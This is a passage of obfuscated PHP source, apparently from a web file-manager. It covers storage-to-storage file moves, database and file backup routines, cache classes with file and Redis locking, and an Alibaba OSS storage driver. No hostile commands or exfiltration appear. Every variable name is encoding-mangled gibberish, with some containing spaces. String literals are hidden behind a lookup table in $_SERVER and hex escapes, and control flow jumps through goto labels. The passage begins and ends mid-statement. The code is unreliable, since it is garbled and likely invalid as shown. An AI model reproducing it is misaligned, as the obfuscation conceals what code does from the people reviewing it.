Model($Ù“ò½ªÆ[213])->where($…áÎÃåÂ)->field($Ù“ò½ªÆ[2201])->select(); foreach ($İ‘¸ü° as $£÷ÛØñó) { $··”Ÿ¡ï = $£÷ÛØñó[$Ù“ò½ªÆ[84]]; $–û¢¤êŞ = $è¼“òØÃ . str_replace("\x7b\x69\x6f\x3a{$‘‹â¹õé}\x7d\57", $Ù“ò½ªÆ[12], $··”Ÿ¡ï); if (!IO::exist($··”Ÿ¡ï)) { $ºåïúó¤[] = $£÷ÛØñó[$Ù“ò½ªÆ[508]]; $Š«Î¤Æ³->updateFileEnd($£÷ÛØñó[$Ù“ò½ªÆ[32]], $£÷ÛØñó[$Ù“ò½ªÆ[76]]); continue; } if (IO::exist($–û¢¤êŞ)) { $Š«Î¤Æ³->updateFileEnd($£÷ÛØñó[$Ù“ò½ªÆ[32]], $£÷ÛØñó[$Ù“ò½ªÆ[76]]); continue; } if (!IO::move($··”Ÿ¡ï, get_path_father($–û¢¤êŞ))) { $ã ¼‰¿™ = !1; break; } $…áÎÃåÂ = array($Ù“ò½ªÆ[508] => $£÷ÛØñó[$Ù“ò½ªÆ[508]]); $ŞËÎ¦¢ = array($Ù“ò½ªÆ[839] => $è“Í„¤¼, $Ù“ò½ªÆ[84] => $–û¢¤êŞ); Model($Ù“ò½ªÆ[213])->where($…áÎÃåÂ)->save($ŞËÎ¦¢); } $this->removeByFileID($ºåïúó¤); if (!$ã ¼‰¿™) { $Š«Î¤Æ³->stop($ìªª²£ø); return !1; } $Š«Î¤Æ³->end(); if ($ıü¤±¶ú == $Ù“ò½ªÆ[1835]) { $this->remove($‘‹â¹õé); } } public function progress($…Ê¹À, $šéŠãŒ¶) { return Task::get($šéŠãŒ¶ . $_SERVER[”ôÑ§ì¸][2198] . $…Ê¹À); } private function removeByFileID($ì©Õò‚ø = array()) { $öŞßÆä– =& $_SERVER[”ôÑ§ì¸]; if (empty($ì©Õò‚ø)) { return; } $›“Ãš½ê = array($öŞßÆä–[508] => array($öŞßÆä–[7], $ì©Õò‚ø)); $á°©¶Í„ = Model($öŞßÆä–[1363])->where($›“Ãš½ê)->field($öŞßÆä–[180])->select(); if (!$á°©¶Í„) { return; } $á°©¶Í„ = array_to_keyvalue($á°©¶Í„, $öŞßÆä–[12], $öŞßÆä–[180]); foreach ($á°©¶Í„ as $›•é†öë) { Model($öŞßÆä–[457])->removeNow($›•é†öë, !1); } } private function removeShareItems($­×›÷í“) { $»¡¿áà =& $_SERVER[”ôÑ§ì¸]; $÷×Š¿Ù = "\x7b\151\x6f\x3a{$­×›÷í“}\x7d\57"; $‰ˆéÉ± = array($»¡¿áà[180] => 0, $»¡¿áà[1206] => array($»¡¿áà[426], "{$÷×Š¿Ù}\x25")); $¢¨¼¬„ˆ = Model($»¡¿áà[1846])->where($‰ˆéÉ±)->field($»¡¿áà[632])->select(); if (empty($¢¨¼¬„ˆ)) { return; } $–“¡ÄÏë = array_to_keyvalue($¢¨¼¬„ˆ, $»¡¿áà[12], $»¡¿áà[632]); Model($»¡¿áà[631])->remove($–“¡ÄÏë); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\114\x69\147\150\x74\x41\x70\x70"; public $modelType = "\123\171\x73\x74\x65\x6d\117\x70\164\x69\x6f\156"; public $field = array("\156\x61\x6d\x65", "\x67\162\157\165\160", "\x64\x65\163\x63", "\143\157\156\x74\x65\x6e\164"); public function listData($ÍÔ£îı = false, $Ñû‹Éˆ = "\x6d\157\144\x69\146\x79\124\151\155\145", $ƒ®ªïø• = true) { return parent::listData($ÍÔ£îı, $Ñû‹Éˆ, $ƒ®ªïø•); } public function remove($ùÄü©„©) { $Æ¹‘òìò = $this->findByName($ùÄü©„©); if (!$Æ¹‘òìò) { return !1; } return parent::remove($Æ¹‘òìò[$_SERVER[”ôÑ§ì¸][442]]); } public function add($ş öË„) { if ($this->findByName($ş öË„[$_SERVER[”ôÑ§ì¸][32]])) { return !1; } return parent::insert($ş öË„); } public function update($£ø”¨ë¶, $÷Êƒùğ¬) { $¥‰à¿ÓÅ =& $_SERVER[”ôÑ§ì¸]; $ä»Ëú¤í = $this->findByName($£ø”¨ë¶); $¤úËº£ = $this->findByName($÷Êƒùğ¬[$¥‰à¿ÓÅ[32]]); if (!$ä»Ëú¤í || $¤úËº£ && $¤úËº£[$¥‰à¿ÓÅ[442]] != $ä»Ëú¤í[$¥‰à¿ÓÅ[442]]) { return !1; } return parent::update($ä»Ëú¤í[$¥‰à¿ÓÅ[442]], $÷Êƒùğ¬); } } goto b”ö‚­ß¹Î; EÆç…¬·Ãí: class BackupDbFile { public function __construct() { } public function index() { $äŠª­¼ö =& $_SERVER[”ôÑ§ì¸]; $É¯ÏÆÖ» = Backup::get(); $Ş“ï€­ = $É¯ÏÆÖ»[$äŠª­¼ö[32]]; $ŠÛšÒã¤ = $this->tmpFilesPath() . "\142\141\x63\x6b\x75\160\137{$Ş“ï€­}\57"; $ãĞËÛ·ê = $this->backupPath($É¯ÏÆÖ»); if (!($ãĞËÛ·ê = IO::mkdir($ãĞËÛ·ê))) { return !1; } $©ÑÛ®Ì¬ = IO::listPath($ŠÛšÒã¤); $Ø¿ïáÛÊ = isset($©ÑÛ®Ì¬[$äŠª­¼ö[83]]) ? $©ÑÛ®Ì¬[$äŠª­¼ö[83]] : array(); $œíÅŒÕõ = array_sum(array_column($Ø¿ïáÛÊ, $äŠª­¼ö[76])); if (!$œíÅŒÕõ) { return !1; } $æ°è«Œ¯ = array($äŠª­¼ö[820] => $œíÅŒÕõ, $äŠª­¼ö[821] => time()); Backup::set($æ°è«Œ¯); $Í›€Èğ¢ = new TaskFileTransfer($äŠª­¼ö[822], $äŠª­¼ö[802], count($Ø¿ïáÛÊ), LNG($äŠª­¼ö[803]) . $äŠª­¼ö[429] . LNG($äŠª­¼ö[805]) . $äŠª­¼ö[823]); $Í›€Èğ¢->task[$äŠª­¼ö[785]] = $œíÅŒÕõ; foreach ($©ÑÛ®Ì¬[$äŠª­¼ö[83]] as $Ñµôƒ”Î) { $ª¯¶‰Á÷ = IO::move($Ñµôƒ”Î[$äŠª­¼ö[84]], $ãĞËÛ·ê); if (!$ª¯¶‰Á÷) { $Í›€Èğ¢->end(); $¼èÃı·İ = IO::getLastError($äŠª­¼ö[824] . $Ñµôƒ”Î[$äŠª­¼ö[84]] . $äŠª­¼ö[825] . $ãĞËÛ·ê . $äŠª­¼ö[164]); write_log($¼èÃı·İ, $äŠª­¼ö[802]); return !1; } } $ìÒ‡›å– = new DbManage(); $… è¤Á– = $ìÒ‡›å–->getSqlFile(); if (!$… è¤Á–[$äŠª­¼ö[826]] || !$… è¤Á–[$äŠª­¼ö[13]]) { return !1; } IO::move($… è¤Á–[$äŠª­¼ö[826]], $ãĞËÛ·ê); IO::move($… è¤Á–[$äŠª­¼ö[13]], $ãĞËÛ·ê); $Í›€Èğ¢->end(); $æ°è«Œ¯ = array($äŠª­¼ö[827] => $œíÅŒÕõ, $äŠª­¼ö[828] => time()); Backup::set($æ°è«Œ¯); return !0; } private function backupPath($åüÆûÆƒ) { $ØÀ­Ö›¹ =& $_SERVER[”ôÑ§ì¸]; $Â¢€€ = $åüÆûÆƒ[$ØÀ­Ö›¹[32]]; $Ÿâ©ù‡ = Model($ØÀ­Ö›¹[792])->get($ØÀ­Ö›¹[793]); $´½îŠ„ = substr(md5($ØÀ­Ö›¹[794] . $Ÿâ©ù‡ . $Â¢€€), 0, 8); return "\x7b\151\157\x3a{$åüÆûÆƒ[$ØÀ­Ö›¹[773]]}\x7d\57\144\x61\x74\x61\142\x61\163\x65\x2f\142\x61\143\153\165\160\x2f" . $Â¢€€ . $ØÀ­Ö›¹[11] . $´½îŠ„; } private function tmpFilesPath() { $Øûé‡áŞ =& $_SERVER[”ôÑ§ì¸]; $ùç™¼Š = TEMP_FILES; if ($GLOBALS[$Øûé‡áŞ[6]][$Øûé‡áŞ[89]][$Øûé‡áŞ[818]]) { $ùç™¼Š = $GLOBALS[$Øûé‡áŞ[6]][$Øûé‡áŞ[89]][$Øûé‡áŞ[818]]; if (!mk_dir($ùç™¼Š) || !is_writable($ùç™¼Š) || !IO::mkfile($ùç™¼Š . $Øûé‡áŞ[819])) { $ùç™¼Š = TEMP_FILES; } } return $ùç™¼Š; } } class BackupFile { public function __construct() { } public function index() { $ ¥Šî°¸ = Backup::get(); $€¤À©ªĞ = $ ¥Šî°¸[$_SERVER[”ôÑ§ì¸][336]][$_SERVER[”ôÑ§ì¸][213]][$_SERVER[”ôÑ§ì¸][508]]; $‘»ŠÉÀí = array($_SERVER[”ôÑ§ì¸][509] => array($_SERVER[”ôÑ§ì¸][829], $€¤À©ªĞ), $_SERVER[”ôÑ§ì¸][830] => array($_SERVER[”ôÑ§ì¸][374], $ ¥Šî°¸[$_SERVER[”ôÑ§ì¸][773]])); $à‰ÏÕéĞ = (int) Model($_SERVER[”ôÑ§ì¸][811])->where($‘»ŠÉÀí)->count($_SERVER[”ôÑ§ì¸][508]); $àÊˆÔ´Ş = (int) Model($_SERVER[”ôÑ§ì¸][811])->where($‘»ŠÉÀí)->sum($_SERVER[”ôÑ§ì¸][76]); $çªı¼Ø‘ = new TaskFileTransfer($_SERVER[”ôÑ§ì¸][831], $_SERVER[”ôÑ§ì¸][802], $à‰ÏÕéĞ, LNG($_SERVER[”ôÑ§ì¸][803]) . $_SERVER[”ôÑ§ì¸][804] . LNG($_SERVER[”ôÑ§ì¸][832])); $çªı¼Ø‘->task[$_SERVER[”ôÑ§ì¸][785]] = $àÊˆÔ´Ş; $ÊÃœåË = array($_SERVER[”ôÑ§ì¸][833] => $à‰ÏÕéĞ, $_SERVER[”ôÑ§ì¸][834] => $àÊˆÔ´Ş, $_SERVER[”ôÑ§ì¸][835] => time()); Backup::set($ÊÃœåË); $µ¾·ôÓÉ = !0; $µµ¢ÏÔù = $this->storeIds(); $Ç˜¾¦©ù = 1; $¸ò–§©» = 1000; $ŠÁã“ÇÔ = $—Ç¶±ë‹ = 0; $ÓËå…¥ = array(); $‰ôŠ¹Ô = $±ª³ÜÇ = 0; do { $ÄÔÂ®è = $_SERVER[”ôÑ§ì¸][836]; $úÍ…¶Ä­ = Model($_SERVER[”ôÑ§ì¸][811])->where($‘»ŠÉÀí)->field($ÄÔÂ®è)->order($_SERVER[”ôÑ§ì¸][837])->selectPage($¸ò–§©», $Ç˜¾¦©ù); $Í“ü“âº = !empty($úÍ…¶Ä­[$_SERVER[”ôÑ§ì¸][412]]) ? $úÍ…¶Ä­[$_SERVER[”ôÑ§ì¸][412]] : array(); foreach ($Í“ü“âº as $Î×ç¯“ß) { if (!$this->_fileExist($Î×ç¯“ß, $ÓËå…¥, $µµ¢ÏÔù)) { $à‰ÏÕéĞ -= 1; $àÊˆÔ´Ş -= (int) $Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][76]]; write_log("\146\x69\x6c\145\40\156\157\164\40\145\170\151\x73\x74\56\x66\151\154\x65\x49\104\72{$Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][508]]}\x2c\x20\160\141\164\150\x3a{$Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][84]]}", $_SERVER[”ôÑ§ì¸][838]); continue; } $œÙõÆ·Õ = $Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][84]]; $‘İ¡„Íø = "\x7b\x69\x6f\x3a{$ ¥Šî°¸[$_SERVER[”ôÑ§ì¸][773]]}\x7d" . substr($œÙõÆ·Õ, strlen("\x7b\x69\x6f\72{$Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][839]]}\x7d")); if (IO::exist($‘İ¡„Íø)) { $çªı¼Ø‘->updateFileEnd($Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][32]], $Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][76]]); } else { $‘İ¡„Íø = get_path_father($‘İ¡„Íø); IO::mkdir($‘İ¡„Íø); if (!IO::copy($œÙõÆ·Õ, $‘İ¡„Íø, $_SERVER[”ôÑ§ì¸][840])) { write_log($_SERVER[”ôÑ§ì¸][841] . $œÙõÆ·Õ . $_SERVER[”ôÑ§ì¸][825] . $‘İ¡„Íø . $_SERVER[”ôÑ§ì¸][164], $_SERVER[”ôÑ§ì¸][802]); $µ¾·ôÓÉ = !1; break; } } $€¤À©ªĞ = $Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][508]]; $—Ç¶±ë‹ += 1; $ŠÁã“ÇÔ += $Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][76]]; $±ª³ÜÇ += 1; $‰ôŠ¹Ô += $Î×ç¯“ß[$_SERVER[”ôÑ§ì¸][76]]; if ($ŠÁã“ÇÔ >= 1024 * 1024 * 100) { $ÊÃœåË = array($_SERVER[”ôÑ§ì¸][842] => $€¤À©ªĞ, $_SERVER[”ôÑ§ì¸][843] => $±ª³ÜÇ, $_SERVER[”ôÑ§ì¸][844] => $‰ôŠ¹Ô); Backup::set($ÊÃœåË); $ŠÁã“ÇÔ = $—Ç¶±ë‹ = 0; } } $Ñ‡”í§ = count($Í“ü“âº); $Ç˜¾¦©ù++; } while ($Ñ‡”í§ == $¸ò–§©»); $çªı¼Ø‘->end(); $ÊÃœåË = array($_SERVER[”ôÑ§ì¸][845] => 1, $_SERVER[”ôÑ§ì¸][783] => time(), $_SERVER[”ôÑ§ì¸][797] => 1, $_SERVER[”ôÑ§ì¸][842] => $€¤À©ªĞ, $_SERVER[”ôÑ§ì¸][834] => $àÊˆÔ´Ş, $_SERVER[”ôÑ§ì¸][833] => $à‰ÏÕéĞ, $_SERVER[”ôÑ§ì¸][846] => time()); if ($—Ç¶±ë‹) { $ÊÃœåË[$_SERVER[”ôÑ§ì¸][843]] = $±ª³ÜÇ; $ÊÃœåË[$_SERVER[”ôÑ§ì¸][844]] = $‰ôŠ¹Ô; } Backup::set($ÊÃœåË); $this->_fileFilter($ÓËå…¥); return !0; } private function _fileExist($ÅÜòà‘“, &$Ãœ˜Ş¡Ö, $Ï¼Åø´) { $ŸåÑ‰£ë =& $_SERVER[”ôÑ§ì¸]; $Æø²ÈƒÁ = $ÅÜòà‘“[$ŸåÑ‰£ë[84]]; if (in_array($ÅÜòà‘“[$ŸåÑ‰£ë[508]], $Ãœ˜Ş¡Ö)) { return !1; } if (!in_array($ÅÜòà‘“[$ŸåÑ‰£ë[839]], $Ï¼Åø´)) { return !1; } if (IO::exist($Æø²ÈƒÁ)) { return !0; } $Ú©’ê = get_path_father($Æø²ÈƒÁ); if (IO::exist($Ú©’ê)) { $Ãœ˜Ş¡Ö[] = $ÅÜòà‘“[$ŸåÑ‰£ë[508]]; return !1; } $»ı•ıˆ¸ = array($ŸåÑ‰£ë[839] => $ÅÜòà‘“[$ŸåÑ‰£ë[839]], $ŸåÑ‰£ë[84] => array($ŸåÑ‰£ë[426], "{$Ú©’ê}\x25")); $€¸œßñü = Model($ŸåÑ‰£ë[811])->where($»ı•ıˆ¸)->field($ŸåÑ‰£ë[509])->select(); $Ãœ˜Ş¡Ö = array_merge($Ãœ˜Ş¡Ö, array_to_keyvalue($€¸œßñü, $ŸåÑ‰£ë[12], $ŸåÑ‰£ë[508])); return !1; } private function _fileFilter($¶¦Ç„Î†) { $èê¡Œ¸ª =& $_SERVER[”ôÑ§ì¸]; if (empty($¶¦Ç„Î†)) { return; } $Ììˆ„Ü = array($èê¡Œ¸ª[508] => array($èê¡Œ¸ª[7], array_unique($¶¦Ç„Î†))); $ÄÇğ¹‚¬ = Model($èê¡Œ¸ª[847])->where($Ììˆ„Ü)->field($èê¡Œ¸ª[180])->select(); foreach ($ÄÇğ¹‚¬ as $¡‡…ºŸ) { Model($èê¡Œ¸ª[847])->remove($¡‡…ºŸ[$èê¡Œ¸ª[180]], !1); } } private function storeIds() { $ë«Óçæ— =& $_SERVER[”ôÑ§ì¸]; $ÅÆ°ËÜÀ = Model($ë«Óçæ—[789])->listData(); $ÎÌ–²á‡ = array(); $ãÕ´¶˜ = $GLOBALS[$ë«Óçæ—[6]][$ë«Óçæ—[89]][$ë«Óçæ—[848]]; foreach ($ÅÆ°ËÜÀ as $œÀÜ…›) { $Åìœ€ÖÊ = strtolower($œÀÜ…›[$ë«Óçæ—[95]]); if (!isset($ãÕ´¶˜[$Åìœ€ÖÊ])) { continue; } $©…¥ê¹ó = $ë«Óçæ—[74] . (isset($ãÕ´¶˜[$Åìœ€ÖÊ]) ? $ãÕ´¶˜[$Åìœ€ÖÊ] : ucfirst($Åìœ€ÖÊ)); if (!class_exists($©…¥ê¹ó)) { continue; } $ÎÌ–²á‡[] = $œÀÜ…›[$ë«Óçæ—[442]]; } return $ÎÌ–²á‡; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $€‚ª½ =& $_SERVER[”ôÑ§ì¸]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $“Ç‰²ùÍ = $GLOBALS[$€‚ª½[6]][$€‚ª½[392]]; $€šÈˆ¬¤ = $“Ç‰²ùÍ[$“Ç‰²ùÍ[$€‚ª½[849]]]; $å¹†°ÃÈ = $“Ç‰²ùÍ[$€‚ª½[850]]; switch ($“Ç‰²ùÍ[$€‚ª½[849]]) { case $€‚ª½[21]: self::$handle = Model($€‚ª½[851]); break; case $€‚ª½[852]: self::$handle = new CacheRedis($€šÈˆ¬¤, $å¹†°ÃÈ); break; case $€‚ª½[853]: self::$handle = new CacheMemcached($€šÈˆ¬¤, $å¹†°ÃÈ); break; case $€‚ª½[213]: self::$handle = new CacheFile($€šÈˆ¬¤, $å¹†°ÃÈ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($–•¶Ğ“‚) { if (is_array($–•¶Ğ“‚) || is_object($–•¶Ğ“‚)) { $–•¶Ğ“‚ = json_encode($–•¶Ğ“‚); } $–•¶Ğ“‚ = rawurlencode($–•¶Ğ“‚); return md5(KOD_SITE_ID . $_SERVER[”ôÑ§ì¸][11] . $–•¶Ğ“‚); } public static function get($ïÛîÔ½, $ÚĞÌª¼ = false) { $¿àüÖÌ = self::key($ïÛîÔ½); $®Ö¹ú¹Ç = self::init(); if ($ÚĞÌª¼) { return unserialize($®Ö¹ú¹Ç->get($¿àüÖÌ)); } if (!isset(self::$memoryCache[$¿àüÖÌ])) { $¸¨ú˜ù™ = $®Ö¹ú¹Ç->get($¿àüÖÌ); self::$memoryCache[$¿àüÖÌ] = unserialize($¸¨ú˜ù™); } return self::$memoryCache[$¿àüÖÌ]; } public static function set($ôÆÂú¹, $öğÕ…©Ñ, $¤ûÅò¬ = false) { $­´†¶äù =& $_SERVER[”ôÑ§ì¸]; $ğ¯™™ú¯ = self::key($ôÆÂú¹); if (isset(self::$memoryCache[$ğ¯™™ú¯]) && self::$memoryCache[$ğ¯™™ú¯] === $öğÕ…©Ñ) { return !0; } if ($¤ûÅò¬ === 0) { self::$memoryCache[$ğ¯™™ú¯] = $öğÕ…©Ñ; return !0; } $­ºµ¾· = self::init(); $ÊºÓñ’õ = serialize($öğÕ…©Ñ); CacheLock::lock($ôÆÂú¹ . $­´†¶äù[854]); $‰ú¾©ÏÁ = $­ºµ¾·->set($ğ¯™™ú¯, $ÊºÓñ’õ, $¤ûÅò¬); self::$memoryCache[$ğ¯™™ú¯] = $öğÕ…©Ñ; CacheLock::unlock($ôÆÂú¹ . $­´†¶äù[854]); return $‰ú¾©ÏÁ; } public static function getCall($ÕıÍğä, $Õà• ¹¹, $­ßÌœ³È, $Ö‹·ÔÑğ = array()) { $ÜÅÜØô­ =& $_SERVER[”ôÑ§ì¸]; $°Á‘‹†‘ = self::get($ÕıÍğä); if ($°Á‘‹†‘ || $°Á‘‹†‘ === $ÜÅÜØô­[12]) { return $°Á‘‹†‘; } $°Á‘‹†‘ = call_user_func_array($­ßÌœ³È, $Ö‹·ÔÑğ); $°Á‘‹†‘ = $°Á‘‹†‘ ? $°Á‘‹†‘ : $ÜÅÜØô­[12]; self::set($ÕıÍğä, $°Á‘‹†‘, $Õà• ¹¹); return $°Á‘‹†‘; } public static function remove($¤¨õŠû­) { $Ã¾¶À­÷ = self::key($¤¨õŠû­); unset(self::$memoryCache[$Ã¾¶À­÷]); self::clearTimeout(); CacheLock::lock($¤¨õŠû­); $ùô·‚ï× = self::init()->remove($Ã¾¶À­÷); CacheLock::unlock($¤¨õŠû­); return $ùô·‚ï×; } public static function removeMemory($š±©ÜŞá) { $‰¬Å„ÃØ = self::key($š±©ÜŞá); unset(self::$memoryCache[$‰¬Å„ÃØ]); } public static function clearMemory($Ş¬ö‡‹… = false) { if ($Ş¬ö‡‹…) { $Ş¬ö‡‹… = self::key($Ş¬ö‡‹…); unset(self::$memoryCache[$Ş¬ö‡‹…]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[”ôÑ§ì¸][855])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[”ôÑ§ì¸][856])) { self::init()->clearTimeout(); } } } goto F³ØŸ±ø‹µ; DŸ³äÎë ¦: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‡»ï¹‰Ø =& $_SERVER[”ôÑ§ì¸]; $şã€œ·ç = $GLOBALS[$‡»ï¹‰Ø[6]][$‡»ï¹‰Ø[392]]; self::$cachePath = $şã€œ·ç[$‡»ï¹‰Ø[213]][$‡»ï¹‰Ø[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Åæå©Œ³, $â¦èˆ¸É = 0) { $Ûíú‡ˆ =& $_SERVER[”ôÑ§ì¸]; $…ğ—˜ùá = microtime(!0); $²®¾¸÷ = $…ğ—˜ùá + $â¦èˆ¸É + 0.0001; $„œÒŞˆı = rtrim(self::$cachePath, $Ûíú‡ˆ[8]) . $Ûíú‡ˆ[894] . md5($Åæå©Œ³) . $Ûíú‡ˆ[891]; if (file_exists($„œÒŞˆı) && filemtime($„œÒŞˆı) && filemtime($„œÒŞˆı) < time() - 10) { @unlink($„œÒŞˆı); } do { if (file_exists($„œÒŞˆı)) { cacheLockWait(); continue; } $½‚‚×…ß = fopen($„œÒŞˆı, $Ûíú‡ˆ[895]); if (!$½‚‚×…ß) { return !1; } $»¨…‡ûÆ = flock($½‚‚×…ß, LOCK_EX | LOCK_NB); self::$caches[$Åæå©Œ³] = array($Ûíú‡ˆ[896] => $½‚‚×…ß, $Ûíú‡ˆ[213] => $„œÒŞˆı); fwrite($½‚‚×…ß, $²®¾¸÷); clearstatcache(); if ($½‚‚×…ß && $»¨…‡ûÆ) { return !0; } cacheLockWait(); } while (microtime(!0) < $²®¾¸÷); $this->unlock($Åæå©Œ³); return !1; } public function lockGet($³™•˜Ê) { $­¿»Ÿ½Ì =& $_SERVER[”ôÑ§ì¸]; $ÑÌ¡§çŸ = rtrim(self::$cachePath, $­¿»Ÿ½Ì[8]) . $­¿»Ÿ½Ì[894] . md5($³™•˜Ê) . $­¿»Ÿ½Ì[891]; return file_exists($ÑÌ¡§çŸ); } public function unlock($ëû³÷Ûï) { $ü“çÄÄ« =& $_SERVER[”ôÑ§ì¸]; $ğÌËÊ‚’ = self::$caches[$ëû³÷Ûï]; if (!$ğÌËÊ‚’) { return; } @flock($ğÌËÊ‚’[$ü“çÄÄ«[896]], LOCK_UN); @fclose($ğÌËÊ‚’[$ü“çÄÄ«[896]]); @unlink($ğÌËÊ‚’[$ü“çÄÄ«[213]]); unset(self::$caches[$ëû³÷Ûï]); } } class CacheLockRedis { public function lock($¢—÷ØÁ, $ÎåÈİ‚Ä = 10) { $áŞÎÂ„ò = Cache::init(); $ë™†€¶™ = microtime(!0) + $ÎåÈİ‚Ä; while (microtime(!0) < $ë™†€¶™) { $Ñ…Ÿèİ¾ = $áŞÎÂ„ò->get($¢—÷ØÁ); if (!$Ñ…Ÿèİ¾) { $«¥âËÒû = $áŞÎÂ„ò->setLock($¢—÷ØÁ, $ë™†€¶™, $ÎåÈİ‚Ä); if ($«¥âËÒû) { return !0; } } else { if ($Ñ…Ÿèİ¾ < microtime(!0)) { $áŞÎÂ„ò->set($¢—÷ØÁ, $ë™†€¶™, $ÎåÈİ‚Ä * 2); if ($áŞÎÂ„ò->get($¢—÷ØÁ) === $Ñ…Ÿèİ¾) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¸”øô«) { return Cache::init()->get($¸”øô«); } public function unlock($‘›†‡ôÉ) { return Cache::init()->remove($‘›†‡ôÉ); } } goto A¾İß™®ä†; Bô‹¾±Õ´: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($û¶îá×Î) { parent::__construct(); include_once SDK_DIR . $_SERVER[”ôÑ§ì¸][1397]; $this->_init($û¶îá×Î); } public function _init($»š§Ò…³) { $ ĞìùåÈ =& $_SERVER[”ôÑ§ì¸]; $this->config = $»š§Ò…³; foreach ($»š§Ò…³ as $½¨Çº±« => $É‘ó¯ú) { if (isset($this->{$½¨Çº±«})) { $this->{$½¨Çº±«} = $É‘ó¯ú; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ ĞìùåÈ[1398] . LNG($ ĞìùåÈ[1399])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $·ûâ˜ÂË =& $_SERVER[”ôÑ§ì¸]; $õ·€´¡„ = new OSS\Model\CorsConfig(); $—Õ‡Ñ€• = new OSS\Model\CorsRule(); $—Õ‡Ñ€•->addAllowedOrigin($·ûâ˜ÂË[1400]); $—Õ‡Ñ€•->addAllowedMethod($·ûâ˜ÂË[1401]); $—Õ‡Ñ€•->addAllowedMethod($·ûâ˜ÂË[1402]); $—Õ‡Ñ€•->addAllowedMethod($·ûâ˜ÂË[1403]); $—Õ‡Ñ€•->addAllowedMethod($·ûâ˜ÂË[1404]); $—Õ‡Ñ€•->addAllowedMethod($·ûâ˜ÂË[160]); $—Õ‡Ñ€•->setMaxAgeSeconds(600); $—Õ‡Ñ€•->addExposeHeader($·ûâ˜ÂË[1405]); $—Õ‡Ñ€•->addAllowedHeader($·ûâ˜ÂË[1400]); $õ·€´¡„->addRule($—Õ‡Ñ€•); try { $this->client->putBucketCors($this->bucket, $õ·€´¡„); } catch (OSS\Core\OssException $Ìµæ…­) { return !1; } return !0; } public function getBucketCors() { $¾îŒşï =& $_SERVER[”ôÑ§ì¸]; $Å‘ƒƒâ = null; try { $Å‘ƒƒâ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $»¬ˆÒß) { return null; } if (!$Å‘ƒƒâ || !($‘‘èŞñğ = $Å‘ƒƒâ->getRules())) { return null; } $Áò–„‘© = $‘‘èŞñğ[0]->getAllowedOrigins(); $øËËÚî€ = $‘‘èŞñğ[0]->getAllowedMethods(); $¼Äº™§» = $‘‘èŞñğ[0]->getMaxAgeSeconds(); $úÌíÄà¾ = $‘‘èŞñğ[0]->getExposeHeaders(); $éÂ¦Š° = $‘‘èŞñğ[0]->getAllowedHeaders(); return array($¾îŒşï[201] => isset($Áò–„‘©[0]) ? $Áò–„‘©[0] : $¾îŒşï[12], $¾îŒşï[205] => $øËËÚî€, $¾îŒşï[1406] => $¼Äº™§», $¾îŒşï[1407] => isset($úÌíÄà¾[0]) ? $úÌíÄà¾[0] : $¾îŒşï[12], $¾îŒşï[203] => isset($éÂ¦Š°[0]) ? $éÂ¦Š°[0] : $¾îŒşï[12]); } public function isBucketCors() { $´¹”ƒË§ =& $_SERVER[”ôÑ§ì¸]; $ËŒâÂë = $this->getBucketCors(); if (!$ËŒâÂë || !is_array($ËŒâÂë)) { return !1; } if ($ËŒâÂë[$´¹”ƒË§[201]] != $´¹”ƒË§[202] || $ËŒâÂë[$´¹”ƒË§[203]] != $´¹”ƒË§[202]) { return !1; } $Ğ£ô––ø = array_map($´¹”ƒË§[204], $ËŒâÂë[$´¹”ƒË§[205]]); if (!is_array($Ğ£ô––ø)) { $Ğ£ô––ø = array(); } $ŸóôúòÙ = array($´¹”ƒË§[206], $´¹”ƒË§[207], $´¹”ƒË§[208], $´¹”ƒË§[209], $´¹”ƒË§[210]); $”úˆÄÆş = array_diff($ŸóôúòÙ, $Ğ£ô––ø); return empty($”úˆÄÆş); } public function mkfile($ğ´â¦·í, $±÷¿œÆœ = '', $ØÓ×Áü = REPEAT_RENAME) { $–ïåòÍ… = $this->setContent($ğ´â¦·í, $±÷¿œÆœ); if ($–ïåòÍ… !== !1) { return $this->getPathOuter($ğ´â¦·í); } return !1; } public function mkdir($æ‹øò™­, $ä¨ßÁ‚õ = REPEAT_SKIP) { if ($ä¨ßÁ‚õ && $this->_isFolder($æ‹øò™­)) { return $this->getPathOuter($æ‹øò™­); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($æ‹øò™­)); } catch (OSS\Core\OssException $Õ«²¸ õ) { return !1; } return $this->getPathOuter($æ‹øò™­); } private function fileList($óõí²øÈ, $ÜÉ¯À¦ = '', $Á‰»±‘ë = 0) { $ÙÒ¬Û =& $_SERVER[”ôÑ§ì¸]; $óõí²øÈ = trim($óõí²øÈ, $ÙÒ¬Û[8]); $Š‹×‘°¶ = empty($óõí²øÈ) && $óõí²øÈ !== $ÙÒ¬Û[211] ? $ÙÒ¬Û[12] : $óõí²øÈ . $ÙÒ¬Û[8]; $¡ÊÀÇÎ  = $ÙÒ¬Û[12]; $ìò‹¦Áì = 1000; 